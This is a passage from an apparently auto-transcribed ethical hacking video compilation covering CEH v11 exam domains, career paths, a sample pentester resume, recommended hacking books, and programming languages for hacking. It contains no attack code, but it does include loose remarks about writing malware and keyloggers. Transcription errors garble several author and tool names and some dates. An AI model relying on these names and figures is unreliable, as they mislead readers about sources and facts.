were 500 million Travelers accounts that
were stolen a lot of credit card
information uh was uh leaked out email
email accounts were hacked and
compromised and thus there was a lot of
reputation that happened now the thing
is that there are also laws that these
organizations need to adhere to that
tell the organizations how to keep their
information secure and also have
penalties in place if the organization
gets hacked and the penalties are pretty
severe so organizations do not want to
get hacked or do not want to get
compromised not only from the customer's
perspective where they would be losing
customers losing reputations and then
thus facing losses but also from a
legislative perspective where they would
have to pay fines to the government for
the frauds that have happened so these
are some of the popular hacking cases
that have caused these organizations
quite a lot of money and thus uh they
have a lot of security in mind uh if you
look at the news uh in BBC News there
was something reported from a French
police that there was a virus that
infected more under 850 000 computers
worldwide now on the similar lines if
you remember ransomware's and if you
look at Wanna Cry that happened in 2018
or 2017 it also cost the world 4 billion
dollars in losses during that just one
small month of its infection then Apple
Google basically disclosed that a large
scale hacking effort was targeted at
Apple devices and this has been it has
reported that there was a sustained
effort to hack iPhones over a period of
at least two years which means that
there's a specific Target towards Apple
consumers and they are at a higher risk
of getting hacked than others then the
Texas government organizations hit by
rap somewhere attack so hackers have
infected 23 organizations connected to
local government in the U.S state of
Texas with ransomware that means that
their databases have been encrypted the
government themselves do not have access
to that database the databases could
have been compromised by the hackers and
that means that whatever Services were
being provided to the users based on
that database May no longer be available
to the end users because of the
ransomware now moving on with these why
won't do we want to become a certified
ethical hacker increase attacks lead to
more job openings now if you look at
ransomware the wanakra attack that
happened in 2017 there was a knee-jerk
reaction given by the rest of the world
for it security suddenly budgets or
started opening up Suddenly people
wanted more ethical hackers on their
payrolls to test for vulnerabilities in
UK and Europe we have gdpr which is
again another law that imposes severe
penalties on organizations that get
hacked and for not having proper
security and a one media assessment and
penetration testing program in place so
that leads to a lot of job requirements
as well where organizations look at
people with this special skill set to
help them mitigate the vulnerabilities
to keep to safeguard them and their
customers from hackers and also from
penalties from law enforcement and
governments so does the demand keeps on
increasing for ethical hackers which
automatically means that the salaries
are going to increase as well so more
the demand lesser the supply higher the
salaries that's plain economics then
challenge hacker with malicious intent
so from ethical hackers perspective it
is our duty to safeguard an organization
which means that will be pitched against
hackers and we have to ensure that those
hackers would be challenged to the
maximum limit before they even try to
get access to any of the resources that
we are trying to protect it offers a
boost in your career so more uh efforts
that you put in more vulnerabilities
that you find the better the career
prospects that you have and the better
job as effects that you're going to get
and this also lets you keep yourself
updated on the latest technology as the
technology progresses as we evolve on
technology Security will also evolve and
the ethical hacker would need to keep
themselves updated on these Technologies
let us understand the importance of the
CH certification before getting to know
about its content
so why should you take up the CH version
11 the certified ethical hacker is the
most trusted ethical hacking
certification and a recommended one by
employers around the globe
since the introduction of the CH
certification in 2003 it is globally
recognized as a standard within the
information security field the CH
version 11 by EC Council continues to
keep up to the standard and it
familiarizes the latest hacking
techniques and teaches you Advanced
hacking tools and exploits used the CH
version 11 aligns with the current cyber
security Market requirements and adds
the latest advancements in the cyber
security field
the CH certification helps and trains
you to think like a hacker and this in
turn helps you beat a hacker and defend
your network after obtaining the CR
certification you'll be a certified
ethical hacker a certified ethical
hacker is a skilled professional working
in a red team environment who safeguards
networks and understands attack
strategies and mimics the skills of
malicious hackers certified ethical
hackers discover vulnerabilities in a
system and operate with permission from
the system owners only
so who can become a certified ethical
hacker and who can take up the CH
certification let us have a look at that
now
in the first case to be eligible for the
CH certification exam you need to attend
the official training from authorized
easy Council training Partners it can be
an online training or tutor-led training
from EC Council learning Partners only
then are you eligible to take up the ca
certification exam
so a candidate who has completed an
official easy Council training is
eligible to take up the exam without
going through the application process
or in the second case in order to be
considered for this credential you need
to have at least two years of work
experience in the information security
domain and you must pay a non-refundable
application fee and submit an
eligibility application form once it is
approved you can take up the CH exam
after the application is approved you
can purchase the test voucher
in the latest version of the CH we will
see the addition of various Core
Concepts moving on to our next topic let
us see how different the CH version 11
is and few of its objectives
firstly it outlines ethical hacking
Concepts cyber kill chain Concepts and
overview of information security and
various laws and regulations related to
information security this certification
briefs you about the faces of system
hacking attacking techniques and how you
can maintain access
it also briefs you about footprinting
Concepts and ways of utilizing
footprinting tools along with necessary
countermeasures
the next objective is to familiarize
with vulnerability assessment along with
a hands-on experience of various
scanning tools
next we have cyber security threats like
malware threats analysis of various
worms viruses and Trojans various
malware Concepts packet sniffing
Concepts and techniques have been
introduced into this domain it also
highlights the concept related to social
engineering denial of service attacks
SQL injection and Aviation techniques it
also speaks about Wireless hacking
Concepts and mobile device management
the concept of operational technology is
a new addition this time
next is getting acquainted with Security
Solutions like firewalls honey ports IPS
derivation and protection
our fifth point is knowing various
topics in cryptography like encryption
algorithms public key infrastructure and
cryptanalysis
moving on the next objective is to
incorporate parrot security OS as it
offers better performance on Lower
powered laptops and machines when
compared to Kali Linux
next is to learn to recognize and deal
with iot based vulnerabilities and
attacks with the CH version 11 course
that covers the latest iot hacking tools
you would be required to ensure the
safety of iot devices
our next point is with respect to the
evolving Cloud industry you would need
to learn how to identify and defend
cloud-based threats and attacks
the latest version of CH includes new
operating systems and Windows 10
configured with domain controller and
vulnerable web applications for
improving hacking skills
finally what is different is that more
than 50 percent of the CH version 11
course is dedicated to practical skills
in live ranges via easy Council Labs EC
Council leads in this aspect of the
industry now that we saw the CH exam
objectives let us look into the CH exam
topics we teach
as you see on your screens this is a pie
chart with nine domains in ch along with
their weightages you can prepare for
your exam accordingly
let us move on and take a closer look at
each of these domains their respective
subdomains and their descriptions
our first domain is information security
and ethical hacking overview
this domain consists of questions from
information security cyber kill chain
Concepts ethical hacking Concepts
various hacking Concepts and information
security laws and standards you can
expect a total number of eight questions
from this domain the weightage of this
section is six percent
the second domain is reconnaissance
techniques under the subdomains we have
footprinting and reconnaissance at first
this covers various topics like
footprinting Concepts footprinting
methodology email footprinting
footprinting through web services DNS
footprinting footprinting through social
engineering Etc
the next subdomain in this section is
scanning networks scanning networks
covers various Concepts like scanning
tools host Discovery port and service
Discovery OS Discovery draw Network
diagrams scanning Beyond IDs firewall
Etc
and our third subdomain under
reconnaissance techniques is enumeration
various topics like SNMP enumeration ntp
and NFS enumeration SMTP and DNS
enumeration and enumeration
countermeasures are covered under this
subdomain a total of 26 questions will
be asked from this domain under
footprinting and reconnaissance you will
have 10 questions and under scanning
networks and other 10 and finally under
enumeration you'll have six questions a
total weightage of 21 is given to this
particular topic
our third domain is system hacking faces
and attack techniques under a third
domain our first sub-domain is about
vulnerability analysis this subdomain
covers topics on vulnerability
assessment vulnerability classification
vulnerability assessment Solutions and
tools and various vulnerability
assessment reports our next subdomain is
about system hacking you have Concepts
like gaining access cracking passwords
vulnerability exploitation escalating
privileges maintaining access covered
under this subdomain and finally we have
malware threads under this domain
malware threads incorporate Concepts
like apt Concepts Trojan Concepts virus
and worm Concepts malware analysis and
so on a total of 21 Questions will be
asked from this domain under
vulnerability analysis there will be
nine questions asked system hacking and
other six questions and finally under
malware threats you will have six other
questions asked that sums up to a total
21 with a weightage of 17 for this
domain
our fourth domain is about Network and
perimeter hacking
here you have various subdomains and one
of it is social engineering under social
engineering you will be asked questions
based on social engineering techniques
Insider threats impersonation on social
networking sites identity theft and so
on it you'll also have various question
on the sniffing Concepts as it is
another subdomain you can also expect
questions from the denial of service
subdomain here questions related to
botnets and DDOS attacks will be asked
various session hijacking concepts are
another crucial part of this domain
the final subdomain is about evading IDs
firewalls and honey pots
here various Concepts on IDs IPS
firewall and honeypots are covered you
will need to understand how to evade
ideas and firewalls and how to detect
honey pots
a total number of 18 questions will be
asked from the fourth domain that is
network and perimeter hacking and the
weightage for this domain is 14 percent
our fifth domain is about web
application hacking and a first
sub-domain in it is hacking web servers
this incorporates concepts related to
web server attacks web server attack
tools patch management and so on the
next subdomain is about hacking web
applications here you have various
concepts related to bypass client-side
controls analyze web applications
footprint web infrastructure attack
access controls and how to perform
injection attacks and so on
finally under the SQL injection
subdomain you'll have questions based on
SQL injection the types of SQL injection
the SQL injection methodology SQL
injection tools Aviation techniques and
SQL injection countermeasures
cure a total of 20 questions will be
asked from this domain and that is a
weightage of 16 will be given to the web
application hacking domain our sixth
domain is solely devoted to wireless
network hacking this domain focuses on
hacking wireless networks various
Wireless Concepts wireless encryption
Wireless threats Wireless hacking tools
various hacking methodologies Bluetooth
hacking and wireless countermeasures are
covered a total of eight questions will
be asked from this domain with a
weightage of six percent our seventh
domain is all about mobile platform iot
and OT hacking our first subdomain here
is hacking mobile platforms here the
concepts that are touched upon our
mobile platform attack vectors hacking
Android OS hacking iOS mobile device
management and mobile security
guidelines and tools
our next sub domain here is about iot
and OT hacking which covers Concepts on
iot hacking tools its methodologies
countermeasures and it also speaks about
OT Concepts OT attacks OT hacking tools
and OT countermeasures you have a total
of 10 questions asked from this domain
with a weightage of eight percent the
next domain is very interesting and it
is all related to Cloud the cloud
computing domain covers Concepts based
on cloud computing serverless Computing
cloud computing threats Cloud hacking
and Cloud security the weightage given
to this domain is six percent with the
total number of questions of seven and
finally we have cryptography as our
ninth domain
as the name suggests this domain covers
topics based on cryptography Concepts
encryption algorithms cryptography tools
public key infrastructure Email
encryption disk encryption Crypt
analysis and countermeasures and seven
questions will be asked from this domain
with a weightage of six percent now that
you saw the CH exam topics weightage let
us have a closer look at the CH exam
details let us first have a look at the
CH exam based on mcqs
the exam title is certified ethical
hacker with the exam code of 312-50 this
exam will have 125 questions with a time
limit of 4 hours the test format is
multiple choice questions the past
percentage varies ideally between 60 to
85 percent now let's have a look at the
CH practical exam details in order to
gain the CH Master recognition it is
mandatory that you take up the CH
practical exam as well the exam title is
certified ethical hacker practical and
this practical exam will have 20
questions with the duration of six SARS
the exam format will be iLab cyber range
and finally the passing score for the CH
practical exam is at 70 percent after
clearing both the McQ based exam and the
Practical exam you can get the CH Master
recognition now that we had a look at
the CH exam details let us have a look
at the career prospects for a
professional with this certification
having the Cs certification guarantees
that you have an insight into the
hacking World hence companies want to
hire professionals who can think like a
hacker and Safeguard their networks and
systems a candidate with the Cs
certification can apply for various
cyber security job roles such as
penetration tester security engineer and
information security analyst from the
long list according to pay scale the
annual average salary of a CH
professional in India is rupees 5 lakhs
per annum meanwhile in the United States
a professional holding the ca
certification earns nearly 93 000 on an
average basis annually now that you had
a look at the CH version 11
certification and its career prospects
what are you waiting for get certified
with simply learn and back that CA
certification with the increase in the
number of cyber crimes across the globe
there is also an increase in the number
of cyber security jobs and the role of
an ethical hacker tops the list hi guys
this is Shruti from Simply learn and
today I will run you through this video
on ethical hacking career so let's get
started and explore the world of ethical
hacking let's begin with a few facts did
you know that by the year 2021 there
will be 3.5 million cyber security job
openings that is a huge number isn't it
and also according to the U.S Bureau of
Labor Statistics there will be 28
increase in the number of jobs from 2016
to 2026 for information security
analysts which includes ethical hackers
this proves that there is a great demand
for ethical hackers at the moment as I
mentioned earlier the number of cyber
crimes across the world will increase as
the digital era will only continue to
grow organizations will be on the
lookout to hire professionals who can
fight these cyber crimes and protect the
company's data and to fight these cyber
crimes we will require individuals who
can think like a hacker and who is that
well to do this job we have ethical
hackers as you might be knowing an
ethical hacker is trained to discover
system vulnerabilities an ethical hacker
is also known as a white hat hacker he
or she is given authorization from the
company to perform security assessments
and at the end an ethical hacker would
have to report the findings back to the
company so that the vulnerabilities can
be fixed an ethical hacker performs
these security assessments with the help
of various hacking techniques and tools
let's now move on to our next topic that
is the steps to become an ethical hacker
you might wonder how to start your
ethical hacking career right well I will
take you through that step by step
firstly the candidate must have a
computer science or an information
technology bachelor's degree it is also
possible to become an ethical hacker
without these degrees but provided you
have the required skill sets and
experience the next requirement to be an
ethical hacker is that the candidate
must have a minimum of two years of
experience in the information security
field you have to start your career with
the software or a networking job and
only then can you move on to the ethical
hacking field you have to start your
career with a software or a networking
job and only then can you move into the
ethical hacking field coming to the
certifications it is necessary for the
candidate to hold various cyber security
certifications certifications play a
vital role in the field of cyber
security your job opportunities can
solely depend on these certifications to
become an ethical hacker you can start
off with the foundational level
certifications such as the CCNA and
CompTIA Security Plus certifications
finally the last step to become an
ethical hacker is to clear the certified
ethical hacker examination CH
certification is provided by the EC
Council it trains the candidate to
protect a company's Network by using the
same tools and methods that a hacker
would use the CH exam will have a
duration of four hours with 125 number
of questions if the candidate clears
this exam then he or she will become a
certified ethical hacker now that you
know the steps to become an ethical
hacker let's look into the skill sets
which are required to help you achieve
these steps first and foremost an
ethical hacker needs to have an in-depth
knowledge of the working of the
operating systems knowledge of Windows
Linux and Macintosh operating systems is
required for penetration testing
creating exploits and bug hunting
programming will be important so
knowledge of programming languages such
as CEC plus plus HTML Python and PHP
will be very helpful basic knowledge of
networking tcpip protocols and OSI model
is necessary as networking is the
foundation of cyber security for
securing databases knowledge of SQL
nosql postgresql is necessary
cryptography is used to secure
information it is the process of
converting data from a readable format
to a non-readable format and vice versa
cryptanalysis is decryption without a
secret key in most cases certified
ethical hacker would need to perform
cryptanalysis hence ethical hacker has
to be comfortable with cryptography and
cryptanalysis ethical hackers should be
proficient in network security control
measures such as intrusion detection and
intrusion prevention techniques now
let's move on to the responsibilities
which are taken care of by an ethical
hacker let's have a look at these
responsibilities an ethical hacker is
responsible for scanning systems open
and closed ports using tools like nessus
and nmap vulnerabilities and threats are
identified by doing this in addition to
scanning for vulnerabilities they also
search the Deep corners of the network
to spot critical information such as
passwords which can make the
organization vulnerable to an attack in
addition to building and maintaining IDs
IPS and firewalls they also try to evade
these security measures to gauge the
performance of the systems a lot of
times a company's online fraud or online
theft incidents are looked into buy an
ethical hacker an ethical hacker also
checks for sniffing networks and
hijacked web servers and applications
those were the responsibilities of an
ethical hacker now let's look into the
various job roles in ethical hacker can
apply for it is a misconception that an
ethical hacker will perform only
penetration testing well there are a
number of other jobs an ethical hacker
can apply for the different job roles
such as that of a penetration tester
information security analyst security
consultant and an information security
manager let's have a look at each of
these job roles one by one a penetration
tester performs the typical
responsibility of an ethical hacker that
is he or she tries to exploit a security
system's vulnerabilities this is carried
out using different hacking tools and
techniques an ethical hacker can also
apply for the role of an information
security analyst there is a difference
between the job rules of a penetration
tester and that of an information
security analyst here the candidate will
be required to primarily design and
protect the organization's network from
various cyber attacks finally the
candidate is also required to document
the identified security breaches so that
it can be omitted the next time the
responsibilities of a security
consultant is more or less similar to
that of an information security analyst
that we saw previously as a security
consultant you will be responsible to
design Implement and maintain various
security architectures in addition to
this you're also required to upgrade the
security systems as and when required
finally an ethical hacker can also apply
to the role of an information security
manager as the name suggests this role
will require the candidate to possess
managerial skills as an information
security manager is responsible to head
the it and the information security team
now that we have seen the
responsibilities the skills and the
steps to become an ethical hacker let's
have a look at the different companies
hiring ethical hackers to name a few we
have Bank of America
Ernest and Young KPMG Urban Pro and IBM
let's now look into the salary structure
of an ethical hacker well in India the
average annual salary of a certified
ethical hacker is nearly 4 lakhs 76 000
rupees and in the US the average annual
salary of a certified ethical hacker is
91 000 now I will guide you through a
sample resuming of a penetrator Asian
tester as you can see on your screens
this is a sample resume of a penetration
tester we will look into this resume
closely and understand how your resume
should look like if you are applying for
the role of a penetration tester as
always you can start off with your name
and your email ID and your phone number
followed by a brief summary of your
current job profile it is preferred to
add your LinkedIn profile link here and
also your GitHub profile link if you
have one as I mentioned earlier this is
a sample resume for a penetration tester
and hence we have to have more than two
years of experience in the information
security field as you can see under the
experience section the candidate has two
prior experiences out of which the first
experience is that of a software tester
and second is that of a penetration
tester you would have to mention your
latest or current experience at the
beginning you can mention your job role
and the company and the duration and
under which you can list out the various
responsibilities that you are looking
into currently if you are a penetration
tester you can mention responsibilities
such as security monitoring Black Box
testing documentation of the results
vulnerability scanning and so on below
this you can mention your first
company's experience with the roles and
responsibilities that you have performed
earlier here the candidate was a
software tester before becoming a
penetration tester let's move on to the
education section here the candidate
holds a bachelor's degree in computer
science you can mention your degree
followed by the university name or if
you're applying for any other role in
the cyber security domain it is
recommended that you list out the
certifications as well to start off with
a CCNA certification will be preferred
followed by a certified ethical hacker
certification which is a must if you are
applying for the role of a penetration
tester in addition to it the certified
expert penetration tester certification
will also hold a great Advantage after
mentioning the certifications you can go
ahead and mention your skill sets here
we have the technical skills and
non-technical skills under technical
skills you can mention the programming
languages that you know here we have C C
plus plus Java pull you can also mention
the operating systems that you have
worked on for example Windows Linux Unix
and in addition to the programming
languages and the OS you can also
mention the tools that you know such as
nmap metasploy tools which will be
helpful if you are applying for the role
of a penetration tester then you can
also mention encryption Technologies
knowledge of SQL and Bug tracking
systems if you have worked on them
before if you have participated in
ecodathons you can mention that here as
well under the non-technical skills you
can mention various competitions that
you have taken part in and the games
that you like and other extracurricular
activities finally you can also mention
the projects undertaken under the
projects undertaken you can talk about
the various projects that you have
performed in your company or outside the
company here we have two projects one as
a software test engineer and second one
as a penetration tester so this is how a
resume of a penetration tester will look
like
before jumping into the best books for
ethical hacking let's speak a bit about
cyber security
I'm sure you all already know what cyber
security is but here's a refresher
cyber security refers to the practice of
protecting networks programs computer
systems and their components from
unauthorized digital access and attacks
did you know that according to the
University of Maryland hackers attack
every 39 seconds that is on an average
2244 times a day now that's a huge
number
speaking of hacking let's define the
term ethical hacking before diving into
the books for it
so when A System's vulnerabilities are
discovered and exploited with the motive
of ensuring system security it is known
as ethical hacking people who carry this
out are termed as ethical hackers
ethical hackers perform hacking with
prior permission from the concern
authorities in order to perform this and
Carry Out penetration testing queries
hacking techniques and tools are used
now let's go ahead and have a look at
how books can help you learn to hack
the books we are going to talk about in
this live session will familiarize you
with hacking on the whole these books
will introduce you to new ideas and help
you solve problems reading in general is
great as it helps with your thought
process and keeps you mentally alert it
is important that you use the
information in the upcoming books only
for lawful purposes so let's get started
and see the best books which can help
you with hacking
the first book we have is the basics of
hacking and penetration testing
this book is written by Patrick
ingridson for all your beginners out
there if you're clueless about how to go
about hacking then this is a good read
for you all having said that this book
is not just for beginners but even for
those individuals who are only exposed
to superficial penetration testing logic
this book Dives deep into the tools and
processes that are used by penetration
testers to gain access to the systems
the basics of hacking and penetration
testing book will help you achieve a
better understanding of offensive
security as well you'll be acquainted
with various faces of ethical hacking
here
the book contains seven chapters and it
focuses on hacking tools such as
backtrack Linux Google reconnaissance
nmap nessus Metasploit and hacker
Defender rootkit to name a few the fun
part is that each chapter consists of
Hands-On exercises that help you
interpret and Implement results in each
phase this book is apt for students
beginning infosec professionals and
Security Consultants
the second book we have is hacking a
beginner's guide to computer hacking
basic security and penetration testing
it is written by John slavio
this is yet another go-to book for
beginners this book can be your first
step to a career in ethical hacking it
will cover all the basics with respect
to hacking security and Pen testing
the tools covered in this book are
history of hacking types of hackers
various types of hacking attacks basic
hacking tools and software and hiding IP
address it also speaks about mobile
hacking hacking an email address
penetration testing and spoofing attacks
up next we have hacking the art of
exploitation
it is written by John Erickson this book
has two editions one which was published
in 2003 and the other in 2008. this book
is famous for the hacking approach it
teaches it focuses on network security
and computer security it helps you
understand how to develop exploits
rather than just using them if you want
to a pure ethical hacking game then this
book definitely requires a read
hacking the art of exploitation in its
second edition introduces you to see
programming from a hacker's perspective
out of the plethora of Concepts that you
will learn in this book few crucial ones
are that you will learn to program
computers using C and shell scripts you
will also be able to outplay security
measures like intrusion detection
systems having said that you will also
learn to hijack TCP connections crack
encrypted Wireless traffic and speed up
Brute Force attacks
let's now have a look at the next
ethical hacking book on our list and
that is Kali Linux an ethical hackers
cookbook
this book revolving around Kali Linux is
written by himanshu Sharma
Kali Linux is primarily used for
advanced penetration testing and also
for security auditing it contains
numerous tools that are geared towards
various security tasks such as security
research penetration testing and so on
this book will help you get started with
installation and configuration of Kali
Linux which will enable you to perform
your tests
in addition to that you will learn to
perform web application exploitation
using tools such as burp you will also
be acquainted with performing Network
exploitation using Metasploit and
Bioshock lastly you will know how to
conduct Advanced penetration testing
these were few of the concepts you will
be learning besides a lot more others in
the book
at number 5 we have met hisployed the
penetration tester's guide
this book is written by four authors
David Kennedy jimo godman Devon Kearns
and matiaharoni the metaspride framework
is a powerful tool for hackers to
exploit IP addresses and ports in it
this framework makes discovering and
exploiting vulnerabilities easy but for
first-time users it can be a little
tricky hence this book will teach you
all about Metasploit
you will learn the Frameworks interfaces
module system and more as you launch
simulated attacks after which you will
move on to Advanced penetration testing
techniques which include Network
reconnaissance client-side attacks
Wireless attacks and targeted social
engineering attacks you will also want
to integrate next posts and map analysis
with metasploy to automate discovery
up next we have penetration testing a
Hands-On introduction to hacking
this book is written by Georgia Reitman
as the name suggests this book shows an
insight into penetration testing a
penetration tester discovers security
weaknesses in operating systems networks
and applications penetration techniques
are used to gauge Enterprise defenses
this book focuses on the core skills and
techniques a penetration tester requires
here you'll go through the prime stages
of an actual assessment which includes
gathering information unravel
vulnerabilities gaining access to
networks and so on
in addition to the above you will learn
to track passwords with the techniques
of brute forcing and word lists bypass
antivirus software automate attacks and
you will also learn to use Metasploit
framework for launching exploits and for
writing your own Metasploit modules out
of the many other learnings
moving on to our next book we have the
hacker Playbook 3.
the hacker Playbook 3 practical guide to
penetration testing is written by Peter
Kim
this is the third actuation of the
hacker Playbook series it brings with
itself new strategies attacks exploits
tips and tricks besides all the new
Concepts it also highlights a few
techniques from the previous versions
many schools have this book Incorporated
in their teaching
the hacker Playbook 3 red team Edition
acquaints you with the red team red team
simulate real world Advanced attacks to
test your organization's defensive teams
a red teamer will accurately test and
validate the overall security program
feeding the hacker Playbook 3 will help
you advance your offensive hacking
skills and attack Parts in addition to
that it also focuses on real world
attacks exploitation custom malware
persistence and more
this heavily lattice book will
incorporate several virtual machines and
custom the hacker Playbook tools
at number 8 we have black hat python
python programming for hackers and Pen
testers
Justin Fields is the author of this book
as you know python is a very strong
programming language and it comes to
Great use when creating powerful and
effective hacking tools python is the
chosen Language by many Security
Professionals across the world and many
exploit Frameworks are written in Python
in this book you will go through the
darker side of Python's capabilities
like infecting virtual machines writing
Network sniffers creating Trojans Etc
this book covers some networking
fundamentals interesting Network tooling
web applications Windows privilege
escalation tricks and more this book as
the author says is a fun read
moving on at number nine we have the web
application hackers handbook finding and
exploiting security flaw
it is written by TAF it started and
Marcus Pinto
this new edition focuses on updated web
applications exposing them to attacks
and executing fraudulent transactions
this web application hackers handbook is
updated to speak about the latest
step-by-step methods for attacking and
defending the large range of
ever-evolving web applications
it also discusses new remoting
Frameworks HTML5 UI redress and hybrid
file attacks to name a few it looks into
attacking authentication attacking the
application server finding
vulnerabilities in source code Etc if
you have already mastered the first
edition you can focus on New Concepts in
this one
now let's head to our last book on our
list at 10 we have web security testing
cookbook systematic techniques to find
problems first
the author of this book is Paco hope and
Ben Walther
security testing is quite often a
neglected one when it comes to the tests
performed on web applications but it is
a very crucial one this book teaches you
how to check for the most common web
security issues it also acquaints you
with installing and configuring free and
good security testing tools
you will also understand how your
application communicates with users and
this book will help you build tests
pinpointed at Ajax functions and help
you automate the tests with the
knowledge of this book and the free
tools used here you can defend your site
so those were the top 10 books for
ethical hacking
now that you had a look at the books
let's move on and see how simply learn
can help you become an ethical hacker
simply learn provides a certified
ethical hacker CH version 10 course this
CS certification training course
provides you Hands-On training that will
help you master the techniques used to
penetrate Network systems and defend
your system against it simply learns
ethical hacking courses aligned with the
latest CH version 10 by EC Council here
you will learn about Trojans back toes
and countermeasures IDs firewalls and
honey pots Advanced hacking Concepts
Network packet analysis mobile and web
Technologies and advanced log management
this course content includes an
introduction to ethical hacking
penetration testing and Technical
hacking Concepts
it also speaks about SQL injection iot
hacking and cryptography to name a few
there are no prerequisites to take up
this certification training course first
let's understand the importance of
knowing programming for hacking you
might wonder if programming is a
necessity to become a hacker as you
might be aware hacking involves breaking
the protocols and exploiting a network
thus being a hacker requires you to
understand the languages of the software
that you are focusing on
hence it is required that a hacker knows
coding having zero coding knowledge will
definitely limit your opportunities in
the future
knowing different programming languages
is undoubtedly an asset for hackers
everyone wants to become a hacker today
however it is not as easy as it is shown
in numerous movies it takes plenty of
practice and programming knowledge to
become an ethical hacking expert
if you want to become a hacker it is
imperative that you have a knack for
programming languages it is a known fact
that some of the world's best hackers
started off as programmers
if you know how to program you will be
able to dissect a code and analyze it
you can write your scripts or malware
that can be used on the victim yes there
are several ready-made scripts available
today however you might need to apply
your skills in case the available
scripts don't work well for you
sometimes when script modification is
required you should be in a position to
do that in such a scenario zero
knowledge of the respective programming
language will definitely be a hindrance
programs can also help you automate
multiple tasks which would normally take
a lot of time
codes allow you to penetrate different
fields you want to hack it will help you
identify the plan behind an attack and
defend against deadly hacking techniques
and make your cyber security career
worthwhile
it will help you understand the working
of the target system or application
before carrying out an exploit
now that we have an idea as to why
programming is important for hackers let
us understand which programming
languages should a hacker learn there
are several programming languages for
hacking and it might be overwhelming to
choose from the endless list
here we are to help you with that do
keep in mind that your choice of
programming language will also depend on
the type of system you are targeting and
your strategy
let us now move on to the list of the
top programming languages that are
extensively used by hackers around the
world
as you see on your screens here we have
the top 5 programming languages for
hackers let us go through them one by
one number one on our list is one of the
most popular programming languages today
that is python
python is a general purpose programming
language and in the field of hacking it
is mainly used for exploit writing
it is referred to as the de facto
hacking programming language it plays a
crucial role in writing hacking scripts
exploits and malicious programs
one great feature that makes hacking
easy with python is the availability of
ready-made modules
for example OS modules are available if
the target is a native operating system
for networking there is a socket module
and a lot more
python socket programming can be used
for discovering vulnerabilities in a
system since python code helps in
checking the security Integrity of
systems and it can also be used to
exploit them python has a massive
community that helps with third-party
plugins every day it is also an easy to
read language with a simple syntax this
will be helpful for beginners you can
easily write automation scripts using
Python and it also makes prototyping
much faster
moving on to our second programming
language we have JavaScript
currently JavaScript is one of the best
programming languages for hacking web
applications
a good understanding of JavaScript
allows a hacker to discover
vulnerabilities and carry web
exploitations since most of their web
apps use JavaScript or one of its
libraries
knowing JavaScript will help you
discover flaws in web applications
JavaScript can be used to read saved
cookies and Security Experts also use
JavaScript to develop cross-site
scripting programs for hacking
JavaScript is known for carrying out
attacks like cross-site scripting
JavaScript can also be used to spread
and reproduce malware and viruses easily
initially JavaScript was a client-side
scripting language however with the
release of node.js it now supports
back-end development this implies a
larger field for exploitation
a hacker can now use JavaScript to Snoop
the typed words inject malicious code
and track browsing history to name a few
number three on our list is PHP
hypertext preprocessor or PHP is a
dynamic server-side programming language
that is used to build websites
hackers should understand PHP as it will
help them understand web hacking
techniques better
especially if you are into web hacking
then getting your hands on PHP would be
an asset
PHP is used in server-side scripting
using PHP you could write a custom
application that modifies settings on a
web server and makes a Target server
susceptible to attacks
with the help of PHP you can also
eliminate any vulnerabilities in your
code
PHP is one of the most powerful
server-side languages used in most of
the web domains this shows how learning
PHP can help you with web hacking and
also help you fight against malicious
attackers
popular content Management Systems run
on a foundation of PHP hence having a
strong knowledge of PHP can help you
protect or compromise such websites
next on a list of the best programming
languages for hackers is SQL
SQL is the acronym for structured query
language although SQL is not a
traditional programming language it is a
language used for only communicating
with databases
several systems like MySQL postgresql
stored their data in databases
SQL is used to interact with such
databases in order to organize add
retrieve delete or edit data from a
database
having an in-depth knowledge of SQL lets
you comprehend the structure of a
database thereby helping you decide
which scripts or tools to deploy
SQL is used for the purpose of web
hacking SQL is undoubtedly the best
programming language when it comes to
hacking into a large databases
it will be impossible to counteract
database attacks without a good
understanding of SQL using SQL hackers
can perform an attack known as SQL
injection attack such an attack enables
hackers to access confidential
information from databases SQL is used
by hackers to develop various hacking
programs based on SQL injection
SQL injection is used to bypass web
application login algorithms that are
weak
such an attack can also help a hacker
View and modify confidential information
from databases
finally at number 5 we have the C
programming language
it is no surprise that we have C the
mother of all programming languages on
our list
it is used massively in the security
field it helps with exploit writing and
development the low-level nature of C
provides an edge over other programming
languages used for hacking
a hacker can use the C programming
language to his or her Advantage when it
comes to accessing low-level Hardware
components such as the ram
Security Professionals mostly you see
when they are required to manipulate
system resources and Hardware
C also helps penetration testers write
programming Scripts
most operating systems and computer
programs are coded in C language hence
learning C you will help hackers get an
overview of the structure of operating
systems
C is also used to create shell codes
root kits exploits build undetectable
malware keyloggers and much more
sometimes it is also advisable to learn
both C and C plus plus as they both come
in handy for hackers
so those were our top five programming
languages for hackers do keep in mind
that the most important step of becoming
a hacker is to learn various programming
languages it will be great if you can
Master a variety of programming
languages as your target will not be the
same always on that note in addition to
previously mentioned programming
languages we have an additional list of
languages that are also well recognized
for hacking let's have a look at our
honorary mention
first we have Ruby the Ruby programming
language has been used for exploitation
for quite some time now there can be a
close comparison drawn between Ruby and
python based on its syntax however Ruby
is more web focused
Ruby can be used to write either small
or large scripts and can be used
interchangeably with bash scripting
it offers good flexibility while writing
exploits Ruby has been used by several
hackers to exploit corporate systems it
is not that easy to master Ruby and that
is one reason why mncs look for
professionals who know Ruby
second we have pull although Pearl has
lost its old Fame it still holds value
in the hacker Community for exploit
writing
there are systems that still run on Perl
as it was the go-to solution once
it is a great language that can help you
manipulate Linux text files and help you
create tools and exploits
pull code bases still do occupy a
considerable portion of corporate tools
third on our list is HTML many of you
might have wondered why we didn't
mention HTML yet yes no programming list
is complete without mentioning HTML
the hypertext markup language HTML is a
standard markup language used for
creating web pages
it glues the whole internet together and
it is the language of the web this shows
the importance HTML has
an understanding of HTML is vital to
play with web applications
HTML also Finds Its use in developing
hybrid mobile and desktop apps
HTML is a must if you want to master
this field having said that HTML is not
that tough a language to learn hence it
is advised to master HTML if you want to
compromise web applications
and finally at 4 we have assembly level
language it is undoubtedly one of the
most powerful yet hardest programming
languages to learn it is a complicated
low-level programming language
for hacking primitive systems assembly
is one of the best programming languages
the best part of assembly is that you
can instruct machine Hardware or
software using it
Assembly Language helps a hacker
manipulate systems straight up at the
architecture level
it is also the most suited coding
language to build malware like viruses
and Trojans
it is considered to be the best language
for jobs that are time critical
reverse Engineers use Assembly Language
for example if you're interested in
software cracking and if you want to
reverse engineer a piece of software
that has already been compiled assembly
is the go-to choice
as complicated as the language sounds
the results it produces are highly
fruitful
so those were the additional programming
languages that can help you become a
skilled and successful hacker we should
keep in mind that a strong understanding
of programming languages help cyber
Security Professionals stay on top of
cyber criminals so let's start off this
tutorial by understanding the need for
the cssp certification if you have seen
